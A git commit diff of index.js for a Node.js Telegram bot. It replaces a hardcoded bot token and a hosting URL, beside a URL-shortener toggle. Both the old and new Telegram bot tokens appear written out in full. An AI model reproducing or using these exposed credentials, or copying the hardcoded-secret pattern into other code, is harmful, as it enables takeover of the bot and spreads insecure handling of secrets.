d2a5676508ec7f43def0580cdcd7b0c75a8f2723
snjlal267 <snkilal267@gmail.com>
2024-06-16 07:25:51 +0530

    Update index.js

--- index.js
+++ index.js
@@ -8,7 +8,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const botOwnerId = 1249726999;
 
 // Directly adding the token to the code
-const botToken = '6104998193:AAE3w2GAh4QiKTWFsd0sozc_0ilCHsFNnzQ';
+const botToken = '6798138042:AAEm4hyRxjDLQyXeJDQztnuTbWzqPdHVXlw';
 
 // Create a bot that uses 'polling' to fetch new updates
 const bot = new TelegramBot(botToken, { polling: true });
@@ -19,7 +19,7 @@ app.use(bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: '
 app.set("view engine", "ejs");
 
 // Modify your URL here
-var hostURL = "https://gen.djdjkdsk.repl.co";
+var hostURL = "https://sgmodder.adaptable.app";
 // TOGGLE for Shorters
 var use1pt = false;
 
